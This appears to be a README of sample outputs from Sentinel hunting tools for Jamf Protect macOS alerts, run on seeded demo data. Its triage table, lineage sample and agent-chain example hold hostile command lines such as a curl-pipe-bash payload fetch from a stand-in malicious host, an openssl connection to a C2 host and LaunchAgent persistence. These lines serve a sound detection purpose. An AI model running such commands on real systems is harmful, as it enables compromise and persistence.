# Sample tool runs

These are real JSON responses returned by each MCP tool when run live against
a Microsoft Sentinel workspace seeded with **400 Jamf Protect alert rows, 200
telemetry rows, and 150 unified-log rows** via LogSeeder.

- Workspace region: `westus2`
- Run date: 2026-05-13
- Tables: `JamfProtectAlertsDemo_CL`, `JamfProtectTelemetryDemo_CL`,
  `JamfProtectUnifiedLogsDemo_CL`
- Per-tool raw JSON: [`docs/sample-runs/`](./sample-runs/)

The tools are designed for SOC + agent chaining. The top-of-queue row from
`Jamf_Daily_Triage_Queue` directly feeds `Jamf_Host_Investigation`; suspicious
SHAs / TeamIDs feed `Jamf_IOC_Sweep`; that feeds `Jamf_Process_Lineage`.

---

## 1. `Jamf_Daily_Triage_Queue`

50 deduplicated alert rows ranked by `TriageScore`. Each row carries a
`WhyFlagged` reason list so an agent can summarize *why* without re-deriving.
Unions alerts + unified logs.

```json
{
  "TriageScore": "90",
  "MaxSeverity": "Medium",
  "Result": "Allowed",
  "DvcHostname": "jdoe-mbp.contoso.local",
  "EventType": "UnifiedLog",
  "TargetProcessName": "python3",
  "CmdLine": "sudo launchctl load /Library/LaunchAgents/com.evil.plist",
  "SampleMessage": "Unsigned binary attempted to execute",
  "WhyFlagged": ["credential-access", "persistence", "script-interpreter"],
  "HitCount": "7"
}
```

Top 3 by `TriageScore`:

| Score | Host | Process | WhyFlagged |
| ---: | --- | --- | --- |
| 90 | `jdoe-mbp` | `python3 sudo launchctl load /Library/LaunchAgents/com.evil.plist` | credential-access, persistence, script-interpreter |
| 89 | `vip-mbp-legal` | `bash openssl s_client -connect c2.example.com:443` | credential-access, unsigned-binary, exec-prevented, script-interpreter, high-severity |
| 88 | `jdoe-mbp` | `curl -fsSL http://malicious.example.com/payload.sh | bash` | credential-access, persistence, lolbin-allowed |

---

## 2. `Jamf_Host_Investigation`

Per-host triage view across alerts + unified logs + telemetry. 10 rows.

```json
{
  "DvcHostname": "fin-mbp-finance.contoso.local",
  "OsVersion": "macOS 13.6.1",
  "Serial": "C02DK4567ABC",
  "AlertCount": "46",
  "HighAlertCount": "15",
  "PreventedCount": "20",
  "AllowedCount": "26",
  "UnsignedExecCount": "8",
  "AdHocExecCount": "10",
  "GatekeeperHits": "8",
  "UsbEventCount": "7",
  "DistinctSHAs": "46",
  "DistinctTeamIDs": "5",
  "TeamIDsSeen": ["DEADBEEF99", "XYZW987654", "ABCDE12345", "(unsigned)", "APPLE0COMP"],
  "RiskHints": ["high-severity-alerts", "unsigned-execution", "adhoc-execution", "gatekeeper-or-mrt", "usb-activity"]
}
```

`Timeline` (truncated for brevity) contains the most recent high-signal events
across both streams as `{ts, stream, severity, result, detail}` records.

---

## 3. `Jamf_IOC_Sweep`

Cross-stream IOC lookup. 1 row when the let-binding `Indicator = ""` (matches
everything, useful baseline). Set the let-binding inside Advanced Hunting to
scope to a SHA prefix, Apple Team ID, hostname fragment, process, or cmdline
substring.

```json
{
  "Indicator": "",
  "Lookback": "14.00:00:00",
  "TotalHits": "750",
  "HostsAffected": "10",
  "StreamsMatched": ["alerts", "telemetry", "unifiedlog"],
  "Severities": ["Medium", "Low", "Informational", "High"],
  "SampleTeamIDs": ["XYZW987654", "(unsigned)", "DEADBEEF99", "APPLE0COMP", "ABCDE12345"],
  "SampleProcs": ["perl", "curl", "bash", "python3", "zsh", "Google Chrome", "Microsoft Word", "launchd"]
}
```

`RecentHits` (up to 30 events) gives the agent timestamped context to reason
over. With a real `Indicator` value, the query narrows to just matching rows.

---

## 4. `Jamf_Rare_Binary_Hunt`

50 rare or untrusted binary groups ranked by `RarityScore`.

```json
{
  "RarityScore": "100",
  "Rarity": "Singleton-Untrusted",
  "TargetProcessName": "sudo",
  "SignerType": "Ad Hoc",
  "Prevalence": "1",
  "FleetPrevalencePct": "10",
  "AppearanceCount": "1",
  "HuntReasons": ["adhoc-signed", "singleton-host", "execution-allowed"],
  "TeamIDs": ["(unsigned)"],
  "Parents": ["mdmclient"],
  "SampleCmdLines": ["osascript -e 'do shell script \"whoami\"'"],
  "HostSet": ["ceo-mbp.contoso.local"]
}
```

`Singleton-Untrusted` is the highest-priority bucket: one host, unsigned or
ad-hoc-signed. The fleet-wide noisy stuff (Apple-signed App Store binaries
on every Mac) is filtered out.

---

## 5. `Jamf_USB_Anomaly_Hunt`

10 rows, one per Mac with USB activity in the window, each with three discrete
anomaly signals plus a sample `Timeline`.

```json
{
  "USBAnomalyScore": "100",
  "DvcHostname": "finance-imac-01.contoso.local",
  "USBReasons": ["retried-after-block", "after-hours-mount", "first-time-on-host", "block-event"],
  "UsbEventCount": "8",
  "MountCount": "5",
  "BlockCount": "3",
  "AfterHoursCount": "5",
  "FirstSeenOnHost": true,
  "RetriedAfterBlock": true,
  "AfterHoursMount": true,
  "MaxSeverity": "Medium",
  "MacSerial": "C02XF1JLJG5J"
}
```

`finance-imac-01` tripped all three signals — first ever USB event for the
host, after-hours mounts, and the user retried after a block fired. That's
the SOC's "go look" row.

---

## 6. `Jamf_Mac_Endpoint_Risk_Profile` ★

10 rows, the flagship per-Mac risk ranking.

```json
{
  "DvcHostname": "vip-mbp-legal.contoso.local",
  "RiskScore": "100",
  "TotalAlerts": "36",
  "HighCount": "11",
  "MediumCount": "5",
  "PreventedCount": "14",
  "UnsignedBinaryCount": "10",
  "GatekeeperBypassCount": "5",
  "USBEventCount": "5",
  "UniqueTargetProcs": "21",
  "OsVersion": "macOS 14.4.1",
  "AlertTypes": ["FileSystem", "USB", "Process", "MRT", "UnifiedLog", "Click", "ProcessDenied", "Keylog"]
}
```

Top 3 by RiskScore (all hit the 100 ceiling): `vip-mbp-legal`,
`finance-imac-01`, `jdoe-mbp`. These three are the SOC's "investigate first"
list.

---

## 7. `Jamf_Process_Lineage`

50 parent-child process pairs ranked by `LineageScore`.

```json
{
  "LineageScore": "100",
  "ParentProcessName": "loginwindow",
  "TargetProcessName": "nc",
  "LineageReasons": ["shell-from-gui", "unsigned-child", "rare-lineage", "high-severity"],
  "PairCount": "2",
  "DistinctHosts": "2",
  "HostSet": ["jdoe-mbp.contoso.local", "mkt-mbp-02.contoso.local"],
  "SignerTypes": ["Developer", "Unsigned"],
  "TeamIDs": ["(unsigned)", "ABCDE12345"],
  "SampleCmdLines": [
    "sudo launchctl load /Library/LaunchAgents/com.evil.plist",
    "osascript -e 'do shell script ...'"
  ]
}
```

`loginwindow -> nc` (netcat) is exactly the kind of macOS tradecraft worth
escalating: a GUI session process spawning a network-listener LOLBin.

---

## 8. `Jamf_MITRE_ATTACK_Coverage`

15 macOS techniques observed in the window.

```json
{
  "Technique": "T1204 - User Execution",
  "CoverageScore": "100",
  "HitCount": "104",
  "HostsAffected": "10",
  "HighCount": "25",
  "MediumCount": "25",
  "LowCount": "28",
  "PreventedCount": "62",
  "AllowedCount": "42",
  "Streams": ["alerts"],
  "EventTypes": ["Download", "ProcessPrevented", "ProcessDenied", "Gatekeeper", "Click", "USB", "FileSystem"],
  "TopProcs": ["openssl", "Microsoft Word", "osascript", "python3", "zsh", "sh", "ruby"]
}
```

The top techniques across alerts + unified logs in this window: T1204 User
Execution, T1547.013 LaunchAgent Persistence, T1056.001 Keylogging, T1059.004
Unix Shell, T1052.001 USB Exfiltration, T1553.001 Gatekeeper Bypass.

---

## 9. `Jamf_Alert_Tuning_Candidates`

30 noisy signatures flagged for SOC tuning review.

```json
{
  "TuningScore": "70",
  "EventType": "MRT",
  "EventOriginalType": "GPKeylogRegisterEvent",
  "HitCount": "5",
  "DistinctHosts": "5",
  "AllowedRatio": "40",
  "HighRatio": "0",
  "LowRatio": "80",
  "TuningReasons": ["low-severity-heavy", "fleet-wide", "trusted-signer", "no-high-severity"],
  "SignerTypes": ["Ad Hoc", "Developer"],
  "SampleProcs": ["node", "curl", "Slack", "ssh", "sh"]
}
```

Rows scored 70 are candidates for suppression / allowlisting review; the
`TuningReasons` array gives the SOC a one-glance justification before they
touch a detection rule.

---

## Agent chain example

A Defender agent equipped with this collection can answer "what should I look
at on Macs right now?" in one chain:

1. `Jamf_Daily_Triage_Queue` → top row is `jdoe-mbp` running `python3
   sudo launchctl load /Library/LaunchAgents/com.evil.plist` (persistence +
   credential-access).
2. `Jamf_Host_Investigation` (let `HostFilter = "jdoe-mbp"`) → 46 alerts
   including unsigned execs and Gatekeeper hits; high-signal timeline.
3. `Jamf_IOC_Sweep` (let `Indicator = "(unsigned)"`) → cross-stream hits with
   matching TeamID — answers "where else?"
4. `Jamf_Process_Lineage` → `loginwindow -> nc` LineageScore 100 — answers
   "what's spawning what?"
5. `Jamf_MITRE_ATTACK_Coverage` → frames the response as T1547.013 + T1059.004
   for the incident write-up.
